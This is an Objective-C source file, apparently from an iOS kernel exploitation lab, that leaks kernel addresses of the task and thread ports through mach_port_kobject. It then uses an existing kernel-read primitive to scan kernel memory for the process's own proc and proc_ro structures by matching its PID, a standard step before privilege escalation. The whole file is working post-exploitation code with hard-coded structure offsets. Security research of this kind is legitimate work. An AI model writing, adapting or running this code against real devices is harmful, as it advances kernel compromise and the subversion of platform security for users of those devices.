//
//  P156ProcLocate.m
//  P007OpenOnly
//

#import "P156ProcLocate.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <mach/mach.h>
#import <mach/mach_port.h>
#import <dlfcn.h>
#include <unistd.h>

#define P156_BUILD @"p156-proc-locate-v1"
#define P156_TASK_MAP 0x28
#define P156_PROC_PID 0x60
#define P156_PROC_RO  0x18

typedef kern_return_t (*p156_kobject_fn)(ipc_space_t, mach_port_name_t,
                                         mach_port_type_t *, mach_vm_address_t *);

static BOOL p156_kptr(uint64_t v) {
    return v >= 0xffff000000000000ULL;
}

@implementation P156ProcLocate

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p156 session %@ BUILD %@ ===\n", LabLocalMilitaryNow(), P156_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];

    p156_kobject_fn kobj = (p156_kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
    if (!kobj) {
        [o appendString:@"[-] mach_port_kobject symbol missing\n"];
        return o;
    }

    for (int i = 0; i < 2; i++) {
        mach_port_name_t name = (i == 0) ? mach_task_self() : mach_thread_self();
        unsigned type = 0;
        mach_vm_address_t addr = 0;
        kern_return_t kr = kobj(mach_task_self(), name, &type, &addr);
        [o appendFormat:@"  [%s] port=%#x kr=0x%x type=%#x kaddr=%#llx\n",
            (i == 0) ? "task" : "thread", (unsigned)name, kr, type,
            (unsigned long long)addr];
        if (kr != KERN_SUCCESS || !addr) continue;

        if (!P007LaneLive()) {
            [o appendString:@"    locator only — no live KRW lane; scan skipped\n"];
            continue;
        }
        uint64_t map = P007LaneKRead64((uint64_t)addr + P156_TASK_MAP);
        [o appendFormat:@"    [+0x28] map=%#llx %s\n",
            (unsigned long long)map, p156_kptr(map) ? "(kernel ptr)" : "(not a task?)"];
        if (!p156_kptr(map)) continue;

        uint32_t mypid = (uint32_t)getpid();
        [o appendFormat:@"    scan 0..0x1000 pid=%u pidOff=0x%x roOff=0x%x\n",
            mypid, P156_PROC_PID, P156_PROC_RO];
        int hits = 0;
        for (uint32_t off = 0; off < 0x1000 && hits < 4; off += 8) {
            uint64_t q = P007LaneKRead64((uint64_t)addr + off);
            if (!p156_kptr(q)) continue;
            if (P007LaneKRead32(q + P156_PROC_PID) != mypid) continue;
            uint64_t ro = P007LaneKRead64(q + P156_PROC_RO);
            if (!p156_kptr(ro)) continue;
            if (P007LaneKRead32(q + P156_PROC_PID) != mypid) continue;
            [o appendFormat:@"    HIT bsd_info@+0x%x proc=%#llx proc_ro=%#llx\n",
                off, (unsigned long long)q, (unsigned long long)ro];
            hits++;
        }
        [o appendFormat:@"    [%s] hits=%d %s\n",
            (i == 0) ? "task" : "thread", hits,
            hits ? "SELF-PROC LOCATED (symbol-free)" : "no proc candidate"];
    }

    [o appendString:@"  [verdict] locator receipt only; hasKread still kread32(kbase)==0xfeedfacf\n"];
    [o appendFormat:@"=== p156 end %@ ===\n", LabLocalMilitaryNow()];
    return o;
}

@end
